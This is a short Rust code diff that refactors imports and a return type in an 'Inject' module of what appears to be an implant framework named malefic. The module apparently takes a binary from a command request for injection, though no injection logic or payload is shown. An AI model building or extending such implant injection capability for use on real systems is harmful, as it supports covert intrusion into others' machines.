@@ -1,8 +1,4 @@
-use crate::{prelude::*, ModuleImpl, Result};
-use async_trait::async_trait;
-use malefic_helper::to_error;
-use malefic_proto::proto::implantpb::spite::Body;
-use malefic_trait::module_impl;
+use crate::prelude::*;
 
 pub struct Inject {}
 
@@ -12,7 +8,7 @@ impl Module for Inject {}
 
 #[async_trait]
 impl ModuleImpl for Inject {
-    async fn run(&mut self, id: u32, receiver: &mut Input, _: &mut Output) -> Result {
+    async fn run(&mut self, id: u32, receiver: &mut Input, _: &mut Output) -> ModuleResult {
         let req = check_request!(receiver, Body::Inject)?;
 
         let bin = check_field!(req.bin)?;
